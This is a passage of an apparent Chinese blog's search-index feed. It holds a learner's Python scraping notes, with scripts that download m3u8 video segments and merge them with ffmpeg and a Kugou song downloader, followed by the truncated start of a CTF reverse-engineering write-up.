class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">with</span> concurrent.futures.ProcessPoolExecutor(max_workers=<span class="number">5</span>) <span class="keyword">as</span> exector:</span><br><span class="line">    <span class="keyword">for</span> url <span class="keyword">in</span> urls:</span><br><span class="line">        exector.submit(download_images, url)</span><br></pre></td></tr></table></figure><h2 id="selenium"><a href="#selenium" class="headerlink" title="selenium"></a>selenium</h2><p>本来想直接上手爬视频的结果发现链接里面根本没有mp4，还是得回来看selenium获取源代码。</p><p>首先pip安装</p><pre><code>pip install selenium</code></pre><p>接着配谷歌driver环境，去官网下载后，然后配环境变量就行了，然后关机重启一次就能用了。</p><p>测试</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">driver = webdriver.Chrome()</span><br><span class="line">driver.get(<span class="string">&quot;https://new.iskcd.com/20211106/HhseFdeO/index.m3u8&quot;</span>)</span><br><span class="line">text=driver.page_source</span><br><span class="line">print(text)</span><br></pre></td></tr></table></figure><h2 id="第四个爬虫"><a href="#第四个爬虫" class="headerlink" title="第四个爬虫"></a>第四个爬虫</h2><p>开始爬视频了，也是自己摸索了很久，视频和图片的爬取还是有非常大的不同的，很多网站视频都采用了m3m8的方式来把mp4文件变成一个个的ts文件，爬取思路就是先得到index.m3m8，然后访问里面的链接，得到返回值，然后提取所有ts文件的url，下载下来，然后用ffmpeg来组装成mp4。</p><p>代码，单线程，比较慢。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">num=<span class="number">0</span></span><br><span class="line">header=&#123;</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>:<span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) &#x27;</span></span><br><span class="line">                <span class="string">&#x27;Chrome/95.0.4638.69 Safari/537.36&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">#检测响应是否正确，一般是200，正确就会返回服务器传回来的数据</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">request_juger</span>(<span class="params">url</span>):</span></span><br><span class="line">    header=&#123;</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>:<span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) &#x27;</span></span><br><span class="line">                <span class="string">&#x27;Chrome/95.0.4638.69 Safari/537.36&#x27;</span>,</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.get(url=url,headers=header)</span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="keyword">return</span> response.text</span><br><span class="line">    <span class="keyword">except</span> requests.RequestException <span class="keyword">as</span> e:</span><br><span class="line">        print(e)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#提起有用信息</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_page_urls</span>():</span></span><br><span class="line">    base_url = <span class="string">&#x27;https://www.great-elec.com/video/924-0-&#x27;</span></span><br><span class="line">    manhua_url = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>,<span class="number">11</span>):</span><br><span class="line">        url = base_url + <span class="built_in">str</span>(i) + <span class="string">&#x27;.html&#x27;</span></span><br><span class="line">        print(url)</span><br><span class="line">        manhua_url.append(url)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> manhua_url</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">download_mp4</span>(<span class="params">title, ts_urls</span>):</span></span><br><span class="line">    <span class="keyword">global</span> num</span><br><span class="line">    header = &#123;</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) &#x27;</span></span><br><span class="line">                      <span class="string">&#x27;Chrome/95.0.4638.69 Safari/537.36&#x27;</span>,</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment"># 发起请求</span></span><br><span class="line"></span><br><span class="line">    print(num)</span><br><span class="line">    <span class="keyword">for</span> ts_url <span class="keyword">in</span> ts_urls:</span><br><span class="line">        name=ts_url.split(<span class="string">&#x27;/&#x27;</span>)[-<span class="number">1</span>]</span><br><span class="line">        res = requests.get(url=ts_url, headers=header)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;D:/learning record/学术报告/python_spider/爬虫/mp4/file_list&#123;&#125;.txt&quot;</span>.<span class="built_in">format</span>(num), <span class="string">&quot;a+&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(<span class="string">&quot;file &#x27;&#123;&#125;&#x27;\n&quot;</span>.<span class="built_in">format</span>(name))</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;D:\\learning record\\学术报告\\python_spider\\爬虫\\mp4\\&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(name), <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(res.content)</span><br><span class="line"></span><br><span class="line">    cmd=<span class="string">&#x27;ffmpeg -f concat -i &quot;D:/learning record/学术报告/python_spider/爬虫/mp4/file_list&#123;0&#125;.txt&quot;. -c copy &quot;D:/learning record/学术报告/python_spider/爬虫/mp4/vidoe/output&#123;1&#125;.mp4&quot;&#x27;</span>.<span class="built_in">format</span>(num,num)</span><br><span class="line">    print(cmd)</span><br><span class="line">    subprocess.Popen(cmd,shell=<span class="literal">True</span>)</span><br><span class="line">    num+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">download</span>(<span class="params">url</span>):</span></span><br><span class="line">    title=<span class="string">&#x27;aa&#x27;</span></span><br><span class="line"></span><br><span class="line">    html = request_juger(url)</span><br><span class="line">    soup = BeautifulSoup(html, <span class="string">&#x27;lxml&#x27;</span>)</span><br><span class="line">    a=soup.find(class_=<span class="string">&#x27;box&#x27;</span>).find(<span class="string">&#x27;p&#x27;</span>).find(<span class="string">&#x27;script&#x27;</span>)</span><br><span class="line">    cmp1 = re.<span class="built_in">compile</span>(<span class="string">&#x27;&lt;script&gt;.*?now=&quot;(.*?)&quot;;.*?&#x27;</span> ,re.S)</span><br><span class="line">    texts = re.findall(cmp1,html)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    m3m8_url=texts[<span class="number">0</span>]</span><br><span class="line">    print(m3m8_url[:<span class="number">40</span>])</span><br><span class="line">    m3u8_html = requests.get(url=m3m8_url, headers=header).text</span><br><span class="line">    print(m3u8_html[-<span class="number">22</span>:-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">    new_m3m8_url=m3m8_url[:<span class="number">40</span>]+m3u8_html[-<span class="number">22</span>:-<span class="number">1</span>]</span><br><span class="line">    print(new_m3m8_url)</span><br><span class="line">    new_m3m8_html = requests.get(url=new_m3m8_url, headers=header).text</span><br><span class="line"></span><br><span class="line">    ts_urls = re.findall(re.<span class="built_in">compile</span>(<span class="string">&#x27;,\n(.*?.ts)\n#&#x27;</span>), new_m3m8_html)</span><br><span class="line"></span><br><span class="line">    download_mp4(title,ts_urls)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    urls=get_page_urls()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> url <span class="keyword">in</span> urls:</span><br><span class="line">        download(url)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>后面弄多线程的时候发现实际上还存在问题，就是拼接new_m3m8_url，可能会出现未能拼接成一个有效的url，当然可以采用split先分割，然后在拼接，因为/是固定的嘛，但是太懒了就没弄了。</p><p>多线程爬，实际上也不快</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">exitFlag = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">myThread</span>(<span class="params">threading.Thread</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, star, name, end</span>):</span></span><br><span class="line">        threading.Thread.__init__(self)</span><br><span class="line">        self.star = star</span><br><span class="line">        self.name = name</span><br><span class="line">        self.end = end</span><br><span class="line">    <span class="comment">#定义了一个 run 方法</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;开始线程：&quot;</span> + self.name)</span><br><span class="line">        func(self.star,self.end)</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;退出线程：&quot;</span> + self.name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">header=&#123;</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>:<span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) &#x27;</span></span><br><span class="line">                <span class="string">&#x27;Chrome/95.0.4638.69 Safari/537.36&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">#检测响应是否正确，一般是200，正确就会返回服务器传回来的数据</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">request_juger</span>(<span class="params">url</span>):</span></span><br><span class="line">    header=&#123;</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>:<span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) &#x27;</span></span><br><span class="line">                <span class="string">&#x27;Chrome/95.0.4638.69 Safari/537.36&#x27;</span>,</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.get(url=url,headers=header)</span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="keyword">return</span> response.text</span><br><span class="line">    <span class="keyword">except</span> requests.RequestException <span class="keyword">as</span> e:</span><br><span class="line">        print(e)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#提起有用信息</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_page_urls</span>(<span class="params">star,end</span>):</span></span><br><span class="line">    base_url = <span class="string">&#x27;https://www.great-elec.com/video/924-0-&#x27;</span></span><br><span class="line">    manhua_url = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(star,end):</span><br><span class="line">        url = base_url + <span class="built_in">str</span>(i) + <span class="string">&#x27;.html&#x27;</span></span><br><span class="line">        print(url)</span><br><span class="line">        manhua_url.append(url)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> manhua_url</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">download_mp4</span>(<span class="params">title, ts_urls,num</span>):</span></span><br><span class="line"></span><br><span class="line">    header = &#123;</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) &#x27;</span></span><br><span class="line">                      <span class="string">&#x27;Chrome/95.0.4638.69 Safari/537.36&#x27;</span>,</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment"># 发起请求</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> ts_url <span class="keyword">in</span> ts_urls:</span><br><span class="line">        name=ts_url.split(<span class="string">&#x27;/&#x27;</span>)[-<span class="number">1</span>]</span><br><span class="line">        res = requests.get(url=ts_url, headers=header)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;D:/learning record/学术报告/python_spider/爬虫/mp4/file_list&#123;&#125;.txt&quot;</span>.<span class="built_in">format</span>(num), <span class="string">&quot;a+&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(<span class="string">&quot;file &#x27;&#123;&#125;&#x27;\n&quot;</span>.<span class="built_in">format</span>(name))</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;D:\\learning record\\学术报告\\python_spider\\爬虫\\mp4\\&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(name), <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(res.content)</span><br><span class="line"></span><br><span class="line">    cmd=<span class="string">&#x27;ffmpeg -f concat -i &quot;D:/learning record/学术报告/python_spider/爬虫/mp4/file_list&#123;0&#125;.txt&quot;. -c copy &quot;D:/learning record/学术报告/python_spider/爬虫/mp4/vidoe/output&#123;1&#125;.mp4&quot;&#x27;</span>.<span class="built_in">format</span>(num,num)</span><br><span class="line">    print(cmd)</span><br><span class="line">    subprocess.Popen(cmd,shell=<span class="literal">True</span>)</span><br><span class="line">    num+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">download</span>(<span class="params">url,num</span>):</span></span><br><span class="line">    title=<span class="string">&#x27;aa&#x27;</span></span><br><span class="line"></span><br><span class="line">    html = request_juger(url)</span><br><span class="line">    soup = BeautifulSoup(html, <span class="string">&#x27;lxml&#x27;</span>)</span><br><span class="line">    a=soup.find(class_=<span class="string">&#x27;box&#x27;</span>).find(<span class="string">&#x27;p&#x27;</span>).find(<span class="string">&#x27;script&#x27;</span>)</span><br><span class="line">    cmp1 = re.<span class="built_in">compile</span>(<span class="string">&#x27;&lt;script&gt;.*?now=&quot;(.*?)&quot;;.*?&#x27;</span> ,re.S)</span><br><span class="line">    texts = re.findall(cmp1,html)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    m3m8_url=texts[<span class="number">0</span>]</span><br><span class="line">    print(m3m8_url[:<span class="number">43</span>])</span><br><span class="line">    m3u8_html = requests.get(url=m3m8_url, headers=header).text</span><br><span class="line">    print(m3u8_html[-<span class="number">22</span>:-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">    new_m3m8_url=m3m8_url[:<span class="number">43</span>]+m3u8_html[-<span class="number">22</span>:-<span class="number">1</span>]</span><br><span class="line">    print(new_m3m8_url)</span><br><span class="line">    new_m3m8_html = requests.get(url=new_m3m8_url, headers=header).text</span><br><span class="line"></span><br><span class="line">    ts_urls = re.findall(re.<span class="built_in">compile</span>(<span class="string">&#x27;,\n(.*?.ts)\n#&#x27;</span>), new_m3m8_html)</span><br><span class="line">    print(ts_urls)</span><br><span class="line">    download_mp4(title,ts_urls,num)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span>(<span class="params">star ,end</span>):</span></span><br><span class="line">    urls=get_page_urls(star,end)</span><br><span class="line">    <span class="keyword">for</span> url <span class="keyword">in</span> urls:</span><br><span class="line">        download(url,star)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># 创建新线程</span></span><br><span class="line">    thread1 = myThread(<span class="number">13</span>, <span class="string">&quot;Thread-1&quot;</span>, <span class="number">14</span>)</span><br><span class="line">    thread2 = myThread(<span class="number">16</span>, <span class="string">&quot;Thread-2&quot;</span>, <span class="number">18</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 开启新线程</span></span><br><span class="line">    thread1.start()</span><br><span class="line">    thread2.start()</span><br><span class="line">    thread1.join()</span><br><span class="line">    thread2.join()</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&quot;退出主线程&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="第五个爬虫"><a href="#第五个爬虫" class="headerlink" title="第五个爬虫"></a>第五个爬虫</h2><p>爬取歌曲，实际上也是找链接，倒是学了json的知识点，就相当于多维字典数组，挺方便。</p><p>实现了输入任意名称，就能爬取显示的所有歌曲，但是试听的只能有一部分。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">download_song</span>(<span class="params">title, song_list,song_name</span>):</span></span><br><span class="line">    <span class="comment"># 新建文件夹</span></span><br><span class="line">    os.mkdir(title)</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> song_list:</span><br><span class="line">        filename = <span class="string">&#x27;%s/%s.mp3&#x27;</span> % (title, song_name[j])</span><br><span class="line">        print(<span class="string">&#x27;downloading....%s : NO.%s&#x27;</span> % (title, song_name[j]))</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            mp3 = requests.get(item).content</span><br><span class="line">            f.write(mp3)</span><br><span class="line">        j += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">request_juger</span>(<span class="params">url</span>):</span></span><br><span class="line">    header=&#123;</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>:<span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) &#x27;</span></span><br><span class="line">                <span class="string">&#x27;Chrome/95.0.4638.69 Safari/537.36&#x27;</span>,</span><br><span class="line">        <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;https://www.kugou.com/&quot;</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.get(url=url,headers=header)</span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="keyword">return</span> response.text</span><br><span class="line">    <span class="keyword">except</span> requests.RequestException <span class="keyword">as</span> e:</span><br><span class="line">        print(e)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    name=<span class="built_in">input</span>()</span><br><span class="line">    base_url=<span class="string">&#x27;https://searchrecommend.kugou.com/get/complex?callback=jQuery112403385798993366811_1636390150231&amp;word=%s&amp;_=1636390150232&#x27;</span>%(name)</span><br><span class="line">    text=request_juger(base_url)</span><br><span class="line"></span><br><span class="line">    useful=re.match(<span class="string">&quot;.*?(&#123;.*&#125;).*&quot;</span>, text, re.S)</span><br><span class="line">    res = json.loads(useful.group(<span class="number">1</span>))</span><br><span class="line">    <span class="built_in">list</span> = res[<span class="string">&#x27;data&#x27;</span>][<span class="string">&#x27;song&#x27;</span>]</span><br><span class="line">    song_list=[]</span><br><span class="line">    song_name=[]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">list</span>:</span><br><span class="line">        AlbumID=i[<span class="string">&#x27;AlbumID&#x27;</span>]</span><br><span class="line">        <span class="built_in">hash</span>=i[<span class="string">&#x27;hash&#x27;</span>]</span><br><span class="line">        song_url=<span class="string">&#x27;https://wwwapi.kugou.com/yy/index.php?r=play/getdata&amp;callback=jQuery19108914882384086649_1636392409637&amp;hash=%s&amp;dfid=4FIh0T1FDOGg2mC8cp3BaW48&amp;appid=1014&amp;mid=96e0f9a5a8a4d183f0034aa8ab27c2c9&amp;platid=4&amp;album_id=%s&amp;_=1636392409638&#x27;</span>%(<span class="built_in">hash</span>,AlbumID)</span><br><span class="line">        <span class="comment">#print(song_url)</span></span><br><span class="line">        song_text = request_juger(song_url)</span><br><span class="line">        song_useful = re.match(<span class="string">&quot;.*?(&#123;.*&#125;).*&quot;</span>, song_text, re.S)</span><br><span class="line">        song_res = json.loads(song_useful.group(<span class="number">1</span>))</span><br><span class="line">        <span class="keyword">if</span>(song_res[<span class="string">&#x27;data&#x27;</span>][<span class="string">&#x27;play_url&#x27;</span>]==<span class="string">&#x27;&#x27;</span>):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        song_list.append(song_res[<span class="string">&#x27;data&#x27;</span>][<span class="string">&#x27;play_url&#x27;</span>])</span><br><span class="line">        song_name.append(song_res[<span class="string">&#x27;data&#x27;</span>][<span class="string">&#x27;song_name&#x27;</span>])</span><br><span class="line">    print(song_list)</span><br><span class="line">    download_song(name,song_list,song_name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 编程learning </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> 爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>东华杯 re wp</title>
      <link href="2021/11/01/%E4%B8%9C%E5%8D%8E%E6%9D%AF%20re%20wp/"/>
      <url>2021/11/01/%E4%B8%9C%E5%8D%8E%E6%9D%AF%20re%20wp/</url>
      
        <content type="html"><![CDATA[<h1 id="东华杯-re-wp"><a href="#东华杯-re-wp" class="headerlink" title="东华杯 re wp"></a>东华杯 re wp</h1><p>做完了逆向，感觉题目难度还是有的，也不知道为什么题目就被打爆了(懂得都懂)，打进了线下，准备去白给，不得不说，诸神之战。<br><img src="https://i.loli.net/2021/11/01/R62ZAy7eurbzPj3.png"></p><p>这次wp写的比较简单，图片都没贴。。。感觉大二课太多了，忙都忙不过来。最近想学学python爬虫，都一直没时间搞。</p><h2 id="ooo"><a href="#ooo" class="headerlink" title="ooo"></a>ooo</h2><p>这次最简单的一道re题了，就一个利用flag里面的几个数生成一个数，然后依次和flag异或，得到密文，虽然密文是4个字节一个，但是不影响。</p><p>爆破就行</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span 